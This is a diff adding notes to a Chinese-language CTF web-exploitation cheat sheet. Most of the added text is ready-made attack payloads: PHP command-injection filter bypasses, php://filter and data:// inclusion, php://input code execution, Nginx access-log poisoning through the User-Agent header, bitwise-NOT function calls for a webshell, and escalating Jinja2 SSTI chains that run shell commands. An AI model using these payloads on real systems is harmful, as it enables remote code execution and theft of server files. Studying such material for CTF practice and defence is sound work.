@@ -187,6 +187,11 @@ SELECT * FROM users WHERE username='vampire     ';
 
 - index.php 的默认路径是 /var/www/html/index.php
 - 看到类似 ?id=1 的 url，无论是不是一个正常页面，可以联想到注入
+- 当 system('ls'); 被绕过时，可以用 passthru("ls"); 代替。再提供一种思路，除了用 system 外，还可以直接 show_source('flag.php')、highlight_file('flag.txt')
+- 当空格和 cat 被绕过，可以用 %09 替代空格，${IFS} 也可以用于替换空格。tac 替代 cat。
+- %27%27 代表 '' 空字符串，可以绕过正则的 flag 匹配
+- php 正则表达式后加一个 /i 表示大小写不敏感匹配
+- 注意 include、eval、system 的区别。执行了代码记得加 ;
 
 ##### 文件漏洞
 - 在做题的时候尽量多试几个题目的提示后缀​（如 index.php、source.php）
@@ -195,6 +200,10 @@ SELECT * FROM users WHERE username='vampire     ';
 > 拿到 webshell
 >
 > 需要注意下，有时候后端是通过 HTTP Headers 的 content-type 来判断文件类型的，改了 content-type 即可绕过。（在 Brup 中，只用改 ------WebKit 下方的 content-type）遇到过一道题，上传类型必须用 image/jpeg，用 jpg 和 png 都不行。
+>
+> 如果看不懂前端验证，可以改成图片格式后用 Burp 传上去，再用 Reapter 将文件后缀改为 PHP 传上去
+>
+> 如果 [] 被过滤了，可以用 {} 替代？？
 
 **test.php**
 
@@ -229,17 +238,53 @@ SetHandler application/x-httpd-php
 ###### 伪协议
 
 **base64**
+
+适用于 eval()、include()
+
 ```url
 http://xxx/?p=php://filter/convert.base64-encode/resource=flag.php
 ```
 
+- 更难的 (绕过 preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)))。**看到正则表达式绕过了 ; 就要联想到该方法，该方法的核心是 ?> 代替 ; ，表示接下来的语句是最后一条语句。
+
+- ```
+  http://xxx/?p=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
+  # php语句中的;可以用?>代替(表示最后一个语句)
+  
+  # 通过使用 http://xxx/?c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php，我们可以看到这里传递给 c 变量的值是 include $_GET[1]，而 1 变量的值为 php://filter/convert.base64-encode/resource=flag.php。
+  # 此时，include 语句将会加载 php://filter/convert.base64-encode/resource=flag.php 文件，并将其转换成 base64 编码形式后输出。由于此时 c 变量的值只是一个 include 语句，因此不会触发正则表达式中的任何敏感词匹配，从而成功绕过了安全措施。
+  
+  
+  # 在此基础上，如果数字也被绕过，改为如下：
+  http://xxx/?p=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+  ```
+
+注释：使用 ?file=flag.php 读取文件可能会因为权限不足而无法读取到内容。因为有些 Web 服务器，如 Apache，会对目录或文件设置访问权限。如果当前用户没有足够的权限来读取 flag.php 文件，则无法读取到该文件的内容。而使用 ?file=php://filter/convert.base64-encode/resource=flag.php 可以绕过这些权限限制，因为 PHP 脚本本身具有读取文件的权限，它可以打开并读取任何一个它拥有的文件。通过将读取到的文件内容转换成 base64 编码后输出，即使该文件是二进制或包含特殊字符，也可以正确地输出文件内容，因此能够获取 flag。
+
 **text/plain**
+
+适用于 include()
+
 ```url
-http://xxx/?p=data://text/plain,<?php system("ls")?>
+http://xxx/?p=data://text/plain,<?php system("ls");?>
+```
+
+然后，使用
+
+```
+http://xxx/?p=data://text/plain,<?php system('cat flag.php');?>
+```
+
+有时候还是被过滤了，就将 <?php system('cat flag.php');?> 转为 base64:
+
+```
+http://xxx/?p=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
+# 当使用数据流协议 data:// 时，可以通过 base64 编码的方式来直接传递数据，而不需要引用外部文件
 ```
 
 **执行 system**
 方法一
+
 ```url
 http://xxx/?page='.system("cat ./templates/flag.php").
 ```
@@ -251,6 +296,18 @@ http://xxx/?page='.system("cat ./templates/flag.php").
 在某些服务器上，执行 system('cat flag.php') 命令将会返回一个空字符串，而不是预期的 flag.php 文件内容。这是因为在 shell 中，管道符 | 表示将前一个命令的输出作为后一个命令的输入。由于执行 system() 函数时，标准输出通常不被捕捉，因此无法获取 cat flag.php 的输出，并且 $a 将被设置为空字符串。
 相反，system('cat flag.php | base64') 命令将会将 flag.php 文件内容进行 base64 编码，然后将编码结果作为字符串返回。由于 base64 编码只使用 ASCII 字符集，可以保证其在 PHP 脚本中的可靠性，并且可以从 $a 中获取到正确的返回值。
 
+另外的示例：
+
+用 || 和 < 分别绕过 Linux 命令和空格。如果题目本来要执行一个 ping 或其他命令，可以这样绕过：
+
+```
+http://xxx/?c=tac<fla%27%27g.php||
+# 只有当 || 左边的内容执行失败时，才会执行右边。%27%27 代表 '' 空字符串，可以绕过正则的 flag 匹配
+# 等效于 ?c=tac<fla''g.php||    , Linux 在 tac 输出时会忽略 ''
+```
+
+
+
 **GET 方法注入字符串到文件流**
 将字符串 hello ctf 注入文件流 file
 ```url
@@ -258,14 +315,32 @@ http://xxx/?file=data://text/plain,hello ctf
 ```
 
 **POST 方法注入字符串到文件流**
+
+适用于 file_get_contents()、include()
+
 > POST 中，GET 方法的一个参数值是 php://input ，POST 中提交纯字符串可作为该参数的值（用于破解 PHP 读文件[如 file_get_contents]，此处可以自己构造文件内容）
+>
+> 如果小写 php 被绕过，可以用 Php://input
 ```
 http"//xxx/?file=php://input
 post data:<?php system("ls /"); ?>
 # 此处的 POST 只传字符串(不是键值对)
 ```
 
+**Nginx 日志文件，通过修改 User-Agent 执行 php 代码**
+
+如果 php://input 都被过滤，可以考虑此方法
+
+例如
+
+```
+访问 http://xxx/?file=/var/log/nginx/access.log
+修改 User-Agent 的值为 Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) <?php system('ls');?>Gecko/20100101 Firefox/56.0 
+# 此处会执行中间插入的代码 <?php system('ls');?> 。（可能要访问2次才会显示，结果可能返回在 html 源码中）
+```
+
 **文件协议**
+
 > 用于url是重定向的情况
 ```
 http://xxx/?url=file:///var/www/html/flag.php
@@ -289,6 +364,15 @@ http://xxx/source.php?file=hint.php?../../../../../ffffllllaaaagggg
 ```
 
 ##### 绕过复杂的正则表达式
+
+> 查看 flag.php 的一种冷门方法
+
+```
+http://xxx/?p=uniq${IFS}f???.php
+```
+
+
+
 > 如 preg_match("/[A-Za-z0-9]+/",$code)
 
 ###### 取反执行某个函数
@@ -302,7 +386,16 @@ echo $d;
 # 返回：%8F%97%8F%96%91%99%90
 ```
 
+访问 url
+
+```
+(~%8F%97%8F%96%91%99%90)();
+```
+
+
+
 ###### 取反连接蚁剑
+
 > 通过构建 assert（eval(_POST['test'])）来使蚁剑连接
 
 ```php
@@ -326,6 +419,8 @@ http://xxx/code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%C
 
 ###### system('ls')
 
+再提供一种思路，除了用 system 外，还可以直接 show_source('flag.php')
+
 如果 system('cat flag.txt') 不成功，可以尝试如 system('cat f*.txt')。（或者可以尝试直接在浏览器访问这个文件）
 
 ##### 变量漏洞
@@ -341,7 +436,8 @@ http://xxx/?p=GLOBALS
 **比较符**
 - ===比较两个变量的值和类型；==比较两个变量的值，不比较数据类型。
 - 在php中,如果bool和"任何其他类型"比较,"任何其他类型"会转换为bool。
-  
+- 看到类似 if(intval($num)) 要联想到弱类型，通过数组绕过。（数组同时可以绕过正则表达式）
+- 447.0 和 447 用 === 比较的时候不相等
 ###### MD5 绕过
 举例（以下几个字符串可绕过弱类型 md5）
 ```
@@ -397,6 +493,25 @@ if($_GET['id'] === null) 是强比较
 >
 > w00m->{a}: 表示调用 w00m 对象的 a 方法，a 是方法名的字符串
 
+反序列化代码示例
+
+```php
+<?php
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=true;
+}
+
+$ctfs = new ctfShowUser();
+echo urlencode(serialize($ctfs));
+?>
+
+// 最后输出时最好使用 urlencode 编码，避免不合规字符串，Cookie 中的 url 编码会被 HTTP 自动解码
+```
+
+
+
 #### tplmap
 
 > Python 注入(PHP 也有 SSTI)
@@ -431,7 +546,55 @@ if($_GET['id'] === null) 是强比较
 http://xxx/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
 ```
 
-##### Unserializer
+##### 执行系统命令
+
+建议根据下面一点一点试（下面的示例层层递进？）
+
+```
+http://xxx/?name={{"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()}}
+
+# 如果被过滤了 2、3 等数字，用下面这个
+http://xxx/?name={{().__class__.__mro__[1].__subclasses__()[407]("cat /flag",shell=True,stdout=-1).communicate()[0]}}
+
+# 在上面的基础上，又被过滤单、双引号
+http://xxx/?name={{().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag
+
+# 继续被过滤 args
+http://xxx/?name={{().__class__.__mro__[1].__subclasses__()[407](request.values.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag
+
+# 继续 过滤了方括号，可以用__getitem__绕过
+http://xxx/?name={{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)}}&a=cat /flag
+
+# 继续，过滤了下划线_
+http://xxx/?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__
+
+# 继续 过滤了os，可以通过get来获取
+http://xxx/?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag
+
+# 继续 过滤了request，但是是再{{}}中过滤了request，没有在{% %}过滤request
+http://xxx/?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
+```
+
+在上面的基础上，基本啥都被绕过了
+
+```
+http://xxx/?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%}
+{%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%}
+{%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%}
+{%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%}
+{%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%}
+{%set oo=dict(o=a,s=a)|join%}
+{%set pp=dict(po=a,pen=a)|join%}
+{%set space=chcr(32)%}
+{%set xiegang=chcr(47)%}
+{%set shell=(dict(cat=a)|join,space,xiegang,dict(flag=a)|join)|join%}
+{%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%}
+```
+
+
+
+##### Unserializer Pickle
+
 示例
 ```python
 import base64
@@ -506,6 +669,8 @@ https://tool.jisuapi.com/base642pic.html
 
 ##### 栅栏密码
 形如(不是标准格式) fg2ivyo}l{2s3_o@aw__rcl@
+
+再来一个 KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}
 
 ##### 培根密码
 
